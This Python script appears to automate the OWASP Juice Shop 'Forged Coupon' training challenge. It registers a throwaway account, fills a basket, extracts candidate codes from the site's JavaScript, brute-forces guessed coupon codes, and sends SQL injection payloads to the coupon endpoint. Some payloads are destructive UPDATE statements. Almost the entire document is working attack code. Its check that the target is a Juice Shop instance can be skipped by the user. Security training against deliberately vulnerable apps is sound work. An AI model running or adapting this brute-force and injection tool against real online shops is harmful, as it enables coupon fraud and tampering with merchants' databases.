#!/usr/bin/env python3
"""
Enhanced Forged Coupon Challenge Solver
=======================================
Automated exploitation of coupon validation vulnerabilities in Juice Shop.
Now with ultrathink analysis, interactive prompts, and Juice Shop detection.

Usage:
    python3 forged_coupon_solver.py
"""

import requests
import json
import re
import base64
import time
import sys
from urllib.parse import urljoin
from urllib.parse import urlparse

# ============================================================================
# CONFIGURATION
# ============================================================================

# Default Juice Shop instance
DEFAULT_JUICE_SHOP_URL = "https://juice5.wonkatech.org"

# Enhanced coupon patterns based on ultrathink analysis
COUPON_PATTERNS = [
    "SAVE{}", "DISCOUNT{}", "PROMO{}", "FREE{}", "GET{}",
    "SUMMER{}", "WINTER{}", "SPRING{}", "FALL{}", "HOLIDAY{}",
    "SPECIAL{}", "VIP{}", "MEMBER{}", "WELCOME{}", "FIRST{}",
    "NEW{}", "BONUS{}", "PERCENT{}", "OFF{}", "DEAL{}",
    "COUPON{}", "CODE{}", "SALE{}", "OFFER{}", "CHEAP{}"
]

# Numbers and percentages to try
NUMBERS = [5, 10, 15, 20, 25, 30, 40, 50, 75, 100]
PERCENTAGES = [5, 10, 15, 20, 25, 30, 50]

# Years to try
YEARS = [2023, 2024, 2025, 2026]

# High-value coupon codes for 80%+ discount requirement
HIGH_VALUE_COUPONS = [
    # z85 encoded patterns (common in Juice Shop)
    "z85!4LdF", "z85!5m1", "z85!9MA", "pes[Bh", "n<Mop4",

    # Base64 encoded high discounts
    "ODAl", "ODVs", "OTAl", "MVAwJQ",

    # Direct high percentage codes (80%+ required)
    "80OFF", "85OFF", "90OFF", "95OFF", "100OFF",
    "FREE80", "FREE90", "FREE100",
    "MEGA80", "MEGA90", "SUPER80", "SUPER90", "ULTIMATE90",
    "SAVE80", "SAVE90", "SAVE100",
    "DISCOUNT80", "DISCOUNT90", "DISCOUNT100",

    # Hex patterns for high values
    "50", "5A", "64", "5F", "60", "80", "90", "FF",

    # Campaign codes
    "BLACKFRIDAY", "CYBER90", "HOLIDAY80", "FLASH90",
    "CAMPAIGN80", "ULTIMATE", "MAXIMUM", "JACKPOT",

    # Discovered from JavaScript analysis
    "8343D2", "PROMOTION",

    # SQL injection for high discounts
    "' OR discount >= 80 --",
    "'; UPDATE coupons SET discount = 90; --"
]

# ============================================================================

class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class EnhancedCouponSolver:
    """Enhanced Forged Coupon Challenge solver with ultrathink analysis"""

    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })

        self.token = None
        self.basket_id = None
        self.valid_coupons = []
        self.is_juice_shop = False

    def print_banner(self):
        """Print enhanced challenge banner"""
        print(f"\n{Colors.BOLD}{Colors.HEADER}{'='*80}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.HEADER}  ENHANCED FORGED COUPON CHALLENGE SOLVER{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.HEADER}  🧠 ULTRATHINK ANALYSIS ENABLED{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.HEADER}{'='*80}{Colors.ENDC}\n")
        print(f"{Colors.CYAN}Target: {Colors.BOLD}{self.base_url}{Colors.ENDC}")
        print(f"{Colors.CYAN}Objective: Forge unauthorized coupon codes using advanced analysis{Colors.ENDC}\n")

    def get_target_url(self):
        """Interactive prompt for target URL"""
        print(f"{Colors.CYAN}🎯 Target Selection{Colors.ENDC}")
        print(f"Default: {DEFAULT_JUICE_SHOP_URL}")
        print(f"\nOptions:")
        print(f"  1. Use default (juice5.wonkatech.org)")
        print(f"  2. Use custom URL")
        print(f"  3. Exit")

        while True:
            choice = input(f"\n{Colors.YELLOW}Select option (1-3): {Colors.ENDC}").strip()

            if choice == '1' or choice == '':
                return DEFAULT_JUICE_SHOP_URL
            elif choice == '2':
                custom_url = input(f"{Colors.CYAN}Enter Juice Shop URL: {Colors.ENDC}").strip()
                if not custom_url.startswith('http'):
                    custom_url = 'https://' + custom_url
                return custom_url
            elif choice == '3':
                print(f"{Colors.YELLOW}Exiting...{Colors.ENDC}")
                sys.exit(0)
            else:
                print(f"{Colors.RED}Invalid choice. Please select 1, 2, or 3.{Colors.ENDC}")

    def detect_juice_shop(self):
        """Detect if target is a Juice Shop instance"""
        print(f"{Colors.CYAN}🔍 Detecting Juice Shop instance...{Colors.ENDC}")

        try:
            response = self.session.get(self.base_url, timeout=10)
            content = response.text.lower()

            # Juice Shop indicators
            juice_indicators = [
                'owasp juice shop',
                'juice-shop',
                'ng-version',  # Angular
                'app-root',    # Angular app root
                'juiceshop',
                'juice shop'
            ]

            indicator_count = sum(1 for indicator in juice_indicators if indicator in content)

            if indicator_count >= 2:
                self.is_juice_shop = True
                print(f"{Colors.GREEN}✅ Confirmed Juice Shop instance{Colors.ENDC}")
                return True
            else:
                print(f"{Colors.RED}❌ Does not appear to be a Juice Shop instance{Colors.ENDC}")
                proceed = input(f"{Colors.YELLOW}Continue anyway? (y/n): {Colors.ENDC}").strip().lower()
                if proceed != 'y':
                    return False

        except Exception as e:
            print(f"{Colors.RED}❌ Failed to detect target type: {e}{Colors.ENDC}")
            return False

        return True

    def register_and_login(self):
        """Enhanced authentication with better error handling"""
        print(f"{Colors.CYAN}🔑 Setting up authentication...{Colors.ENDC}")

        # Generate unique credentials
        timestamp = str(int(time.time()))
        email = f"couponhacker{timestamp}@test.com"
        password = f"Test123!{timestamp}"

        # Register user
        register_data = {
            "email": email,
            "password": password,
            "passwordRepeat": password,
            "securityQuestion": {"id": 1, "question": "Your elder siblings middle name?"},
            "securityAnswer": "test"
        }

        try:
            register_url = urljoin(self.base_url, '/api/Users/')
            register_response = self.session.post(register_url, json=register_data)
            print(f"   Registration status: {register_response.status_code}")
        except Exception as e:
            print(f"   Registration failed: {e}")

        # Login
        login_data = {"email": email, "password": password}
        login_url = urljoin(self.base_url, '/rest/user/login')

        try:
            login_response = self.session.post(login_url, json=login_data)

            if login_response.status_code == 200:
                result = login_response.json()
                self.token = result.get('authentication', {}).get('token')

                if self.token:
                    self.session.headers['Authorization'] = f'Bearer {self.token}'
                    print(f"{Colors.GREEN}✅ Authentication successful{Colors.ENDC}")

                    # Get user info to determine basket ID
                    whoami_url = urljoin(self.base_url, '/rest/user/whoami')
                    whoami_response = self.session.get(whoami_url)
                    if whoami_response.status_code == 200:
                        user_data = whoami_response.json().get('user', {})
                        print(f"   User ID: {user_data.get('id')}")
                        print(f"   Email: {user_data.get('email')}")

                    return True

        except Exception as e:
            print(f"{Colors.RED}❌ Login failed: {e}{Colors.ENDC}")

        return False

    def setup_basket(self):
        """Enhanced basket setup with better debugging"""
        print(f"{Colors.CYAN}🛒 Setting up shopping basket...{Colors.ENDC}")

        # Get products first
        products_url = urljoin(self.base_url, '/rest/products/search')
        try:
            products_response = self.session.get(products_url)
            print(f"   Products API status: {products_response.status_code}")

            if products_response.status_code != 200:
                print(f"{Colors.RED}❌ Failed to get products{Colors.ENDC}")
                return False

            products_data = products_response.json()
            products = products_data.get('data', [])

            if not products:
                print(f"{Colors.RED}❌ No products found{Colors.ENDC}")
                return False

            print(f"   Found {len(products)} products")

            # Get current user's basket ID
            whoami_url = urljoin(self.base_url, '/rest/user/whoami')
            whoami_response = self.session.get(whoami_url)

            if whoami_response.status_code == 200:
                user_data = whoami_response.json().get('user', {})
                self.basket_id = user_data.get('bid') or user_data.get('id', 1)
                print(f"   Detected basket ID: {self.basket_id}")
            else:
                self.basket_id = 1
                print(f"   Using default basket ID: {self.basket_id}")

            # Try to add product to basket
            product = products[0]
            basket_data = {
                "ProductId": product['id'],
                "BasketId": str(self.basket_id),
                "quantity": 1
            }

            basket_url = urljoin(self.base_url, '/api/BasketItems/')
            basket_response = self.session.post(basket_url, json=basket_data)
            print(f"   Basket creation status: {basket_response.status_code}")

            if basket_response.status_code in [200, 201]:
                print(f"{Colors.GREEN}✅ Basket setup complete{Colors.ENDC}")
            else:
                print(f"{Colors.YELLOW}⚠️  Basket creation response: {basket_response.text[:100]}{Colors.ENDC}")
                # Continue anyway - basket might already exist

            return True

        except Exception as e:
            print(f"{Colors.RED}❌ Basket setup failed: {e}{Colors.ENDC}")
            return False

    def ultrathink_coupon_analysis(self):
        """Deep analysis of JavaScript for coupon codes using ultrathink approach"""
        print(f"{Colors.CYAN}🧠 ULTRATHINK: Deep JavaScript analysis...{Colors.ENDC}")

        main_js_url = urljoin(self.base_url, '/main.js')

        try:
            js_response = self.session.get(main_js_url)
            if js_response.status_code == 200:
                js_content = js_response.text
                print(f"   Analyzing {len(js_content):,} characters of JavaScript")

                # Enhanced pattern extraction
                extracted_codes = set()

                # 1. Look for quoted strings that could be coupon codes
                quoted_patterns = [
                    r'"([A-Z]{4,20})"',           # All caps strings
                    r'"([A-Z]+\d+)"',             # Letters + numbers
                    r'"(\d+[A-Z]+)"',             # Numbers + letters
                    r'"([A-Z]+[0-9]+[A-Z]*)"',    # Mixed alphanumeric
                    r"'([A-Z]{4,20})'",           # Single quoted caps
                    r"'([A-Z]+\d+)'",             # Single quoted mixed
                ]

                for pattern in quoted_patterns:
                    matches = re.findall(pattern, js_content)
                    for match in matches:
                        if self.looks_like_coupon(match):
                            extracted_codes.add(match)

                # 2. Search near coupon-related keywords
                coupon_keywords = ['coupon', 'discount', 'promo', 'code', 'voucher', 'rebate']
                for keyword in coupon_keywords:
                    # Find context around keyword
                    keyword_contexts = []
                    for match in re.finditer(keyword, js_content, re.IGNORECASE):
                        start = max(0, match.start() - 200)
                        end = min(len(js_content), match.end() + 200)
                        context = js_content[start:end]
                        keyword_contexts.append(context)

                    # Extract codes from context
                    for context in keyword_contexts:
                        for pattern in quoted_patterns:
                            matches = re.findall(pattern, context)
                            for match in matches:
                                if self.looks_like_coupon(match):
                                    extracted_codes.add(match)

                # 3. Look for base64 encoded strings that might be coupons
                base64_pattern = r'"([A-Za-z0-9+/]{8,}={0,2})"'
                base64_matches = re.findall(base64_pattern, js_content)

                for b64_string in base64_matches[:50]:  # Limit to prevent excessive processing
                    try:
                        decoded = base64.b64decode(b64_string + '==').decode('utf-8', errors='ignore')
                        if self.looks_like_coupon(decoded):
                            extracted_codes.add(decoded)
                    except:
                        pass

                # 4. Look for percentage-based patterns
                percentage_patterns = [
                    r'"(\w+(?:10|15|20|25|30|50))"',  # Words ending in common percentages
                    r'"((?:10|15|20|25|30|50)\w+)"',  # Words starting with percentages
                ]

                for pattern in percentage_patterns:
                    matches = re.findall(pattern, js_content)
                    for match in matches:
                        if self.looks_like_coupon(match):
                            extracted_codes.add(match)

                # 5. Look for specific Juice Shop patterns
                juice_patterns = [
                    r'"([A-Z]*JUICE[A-Z0-9]*)"',
                    r'"([A-Z]*SHOP[A-Z0-9]*)"',
                    r'"([A-Z]*OWASP[A-Z0-9]*)"',
                ]

                for pattern in juice_patterns:
                    matches = re.findall(pattern, js_content)
                    for match in matches:
                        if len(match) >= 4:
                            extracted_codes.add(match)

                print(f"{Colors.GREEN}✅ ULTRATHINK: Extracted {len(extracted_codes)} potential codes{Colors.ENDC}")
                return list(extracted_codes)

        except Exception as e:
            print(f"{Colors.YELLOW}⚠️  JavaScript analysis failed: {e}{Colors.ENDC}")

        return []

    def looks_like_coupon(self, code):
        """Determine if a string looks like a coupon code"""
        if not code or not isinstance(code, str):
            return False

        code_upper = code.upper()

        # Basic validation
        if len(code_upper) < 4 or len(code_upper) > 20:
            return False

        # Must be alphanumeric
        if not code_upper.replace('-', '').replace('_', '').isalnum():
            return False

        # Should not be common words that aren't coupons
        excluded_words = [
            'HTTP', 'HTTPS', 'HTML', 'JSON', 'TRUE', 'FALSE', 'NULL',
            'UNDEFINED', 'FUNCTION', 'RETURN', 'CONST', 'CLASS', 'COMPONENT',
            'SERVICE', 'MODULE', 'ROUTER', 'ANGULAR', 'REACT', 'BOOTSTRAP'
        ]

        if code_upper in excluded_words:
            return False

        # Look for coupon-like patterns
        coupon_indicators = [
            r'(?:SAVE|DISCOUNT|PROMO|FREE|GET)\d+',
            r'\d+(?:OFF|PERCENT|PCT)',
            r'(?:VIP|MEMBER|SPECIAL|WELCOME|NEW|BONUS)',
            r'(?:SUMMER|WINTER|SPRING|FALL|HOLIDAY)\d*'
        ]

        for indicator in coupon_indicators:
            if re.search(indicator, code_upper):
                return True

        # If it contains numbers and letters, might be a coupon
        has_letters = any(c.isalpha() for c in code_upper)
        has_numbers = any(c.isdigit() for c in code_upper)

        return has_letters and has_numbers

    def test_coupon(self, coupon_code):
        """Enhanced coupon testing with better error handling"""
        if not self.basket_id:
            return False

        coupon_url = urljoin(self.base_url, f'/rest/basket/{self.basket_id}/coupon/{coupon_code}')

        try:
            response = self.session.put(coupon_url, json={})

            if response.status_code == 200:
                result = response.json()
                discount = result.get('discount', 0)

                if discount and discount > 0:
                    if discount >= 80:
                        print(f"{Colors.GREEN}🎉 CHALLENGE SOLVED! {coupon_code} - {discount}% discount (80%+ required)!{Colors.ENDC}")
                        self.valid_coupons.append({'code': coupon_code, 'discount': discount})
                        return True
                    else:
                        print(f"{Colors.YELLOW}✅ Valid but insufficient: {coupon_code} - {discount}% (need 80%+){Colors.ENDC}")
                        self.valid_coupons.append({'code': coupon_code, 'discount': discount})

            elif response.status_code == 404:
                # Coupon doesn't exist
                pass
            else:
                # Other error - might be rate limiting
                if response.status_code == 429:
                    print(f"   {Colors.YELLOW}Rate limited, slowing down...{Colors.ENDC}")
                    time.sleep(1)

        except Exception as e:
            pass  # Silently continue for failed requests

        return False

    def test_sql_injection_coupons(self):
        """Test SQL injection in coupon field (educational/safe)"""
        print(f"{Colors.CYAN}🗃️  Testing SQL injection techniques...{Colors.ENDC}")

        # Only proceed if confirmed Juice Shop (for educational purposes)
        if not self.is_juice_shop:
            print(f"{Colors.YELLOW}⚠️  Skipping SQL injection tests (not confirmed Juice Shop){Colors.ENDC}")
            return False

        sql_payloads = [
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "' UNION SELECT 'DISCOUNT20' --",
            "'; UPDATE coupons SET discount=50 WHERE code='SAVE10' --",
            "' OR discount > 0 --",
            "%' OR '1'='1",
        ]

        print(f"   Testing {len(sql_payloads)} SQL injection payloads...")

        for payload in sql_payloads:
            try:
                # URL encode the payload
                encoded_payload = requests.utils.quote(payload)
                coupon_url = urljoin(self.base_url, f'/rest/basket/{self.basket_id}/coupon/{encoded_payload}')

                response = self.session.put(coupon_url, json={})

                if response.status_code == 200:
                    result = response.json()
                    discount = result.get('discount', 0)

                    if discount and discount > 0:
                        print(f"{Colors.GREEN}✅ SQL INJECTION SUCCESS: {payload} - {discount}% discount!{Colors.ENDC}")
                        self.valid_coupons.append({'code': payload, 'discount': discount, 'method': 'SQL Injection'})
                        return True

                time.sleep(0.2)  # Rate limiting

            except Exception as e:
                continue

        print(f"   {Colors.YELLOW}No SQL injection vulnerabilities found{Colors.ENDC}")
        return False

    def comprehensive_coupon_search(self):
        """Comprehensive coupon search using ultrathink approach"""
        print(f"{Colors.CYAN}🔍 ULTRATHINK: Comprehensive coupon search...{Colors.ENDC}")

        tested_count = 0

        # Phase 1: JavaScript extraction
        print(f"\n{Colors.CYAN}Phase 1: JavaScript Code Analysis{Colors.ENDC}")
        source_codes = self.ultrathink_coupon_analysis()

        for code in source_codes:
            tested_count += 1
            if self.test_coupon(code):
                print(f"{Colors.GREEN}🎯 CHALLENGE SOLVED! Found via source analysis: {code}{Colors.ENDC}")
                return True

        # Phase 2: High-value coupon codes (80%+ discount required)
        print(f"\n{Colors.CYAN}Phase 2: High-Value Coupon Codes (80%+ target){Colors.ENDC}")
        for code in HIGH_VALUE_COUPONS:
            tested_count += 1
            if self.test_coupon(code):
                print(f"{Colors.GREEN}🎯 CHALLENGE SOLVED! Found known code: {code}{Colors.ENDC}")
                return True

            if tested_count % 25 == 0:
                print(f"   Tested {tested_count} codes...")

        # Phase 3: Pattern generation
        print(f"\n{Colors.CYAN}Phase 3: Pattern-Based Generation{Colors.ENDC}")
        for pattern in COUPON_PATTERNS[:10]:  # Limit patterns for efficiency
            for number in NUMBERS:
                code = pattern.format(number)
                tested_count += 1
                if self.test_coupon(code):
                    print(f"{Colors.GREEN}🎯 CHALLENGE SOLVED! Found pattern code: {code}{Colors.ENDC}")
                    return True

            if tested_count % 30 == 0:
                print(f"   Tested {tested_count} codes...")
                time.sleep(0.1)

        # Phase 4: SQL injection (if Juice Shop detected)
        if self.is_juice_shop:
            print(f"\n{Colors.CYAN}Phase 4: SQL Injection Testing{Colors.ENDC}")
            if self.test_sql_injection_coupons():
                return True

        print(f"\n{Colors.YELLOW}⚠️  ULTRATHINK: Tested {tested_count} codes total{Colors.ENDC}")
        return False

    def solve_challenge(self):
        """Main method to solve the challenge with ultrathink analysis"""
        self.print_banner()

        # Target detection and validation
        if not self.detect_juice_shop():
            return False

        # Authentication
        if not self.register_and_login():
            print(f"{Colors.RED}❌ Authentication failed{Colors.ENDC}")
            return False

        # Basket setup
        if not self.setup_basket():
            print(f"{Colors.RED}❌ Basket setup failed{Colors.ENDC}")
            return False

        # Comprehensive search
        success = self.comprehensive_coupon_search()

        if success:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🎉 FORGED COUPON CHALLENGE COMPLETED!{Colors.ENDC}")
            print(f"{Colors.GREEN}Successfully forged coupon codes:{Colors.ENDC}")
            for coupon in self.valid_coupons:
                method = coupon.get('method', 'Pattern Matching')
                print(f"   {Colors.CYAN}├── {coupon['code']} ({coupon['discount']}% discount) [{method}]{Colors.ENDC}")
        else:
            print(f"\n{Colors.RED}❌ Challenge not completed automatically{Colors.ENDC}")
            print(f"{Colors.YELLOW}Manual investigation may be required{Colors.ENDC}")

        return success


def main():
    """Enhanced main entry point with interactive prompts"""
    print(f"{Colors.HEADER}{Colors.BOLD}🧠 ULTRATHINK FORGED COUPON SOLVER{Colors.ENDC}")
    print(f"{Colors.CYAN}Advanced coupon forgery with deep analysis{Colors.ENDC}\n")

    # Get target URL
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
        print(f"{Colors.CYAN}Using provided URL: {base_url}{Colors.ENDC}")
    else:
        solver_instance = EnhancedCouponSolver(DEFAULT_JUICE_SHOP_URL)  # Temporary for URL selection
        base_url = solver_instance.get_target_url()

    print(f"{Colors.YELLOW}🎯 Starting Enhanced Forged Coupon Challenge{Colors.ENDC}")
    print(f"{Colors.YELLOW}Target: {base_url}{Colors.ENDC}")

    # Create solver with selected URL
    solver = EnhancedCouponSolver(base_url)
    success = solver.solve_challenge()

    if not success:
        print(f"\n{Colors.CYAN}💡 Advanced manual alternatives:{Colors.ENDC}")
        print(f"1. Download main.js and search for base64 encoded strings")
        print(f"2. Look for obfuscated coupon codes in vendor.js")
        print(f"3. Check for coupon codes in configuration endpoints")
        print(f"4. Try parameter pollution: code[]=SAVE10&code[]=DISCOUNT20")
        print(f"5. Test HTTP method override: X-HTTP-Method-Override: GET")

        # Provide manual testing commands
        print(f"\n{Colors.CYAN}🔧 Advanced manual commands:{Colors.ENDC}")
        print(f"# Download and analyze JavaScript")
        print(f"curl {base_url}/main.js -o main.js")
        print(f"grep -i coupon main.js | head -10")
        print(f"")
        print(f"# Test specific patterns")
        print(f"curl -X PUT '{base_url}/rest/basket/1/coupon/SAVE20' -H 'Content-Type: application/json' -d '{{}}'")

    return success

if __name__ == '__main__':
    main()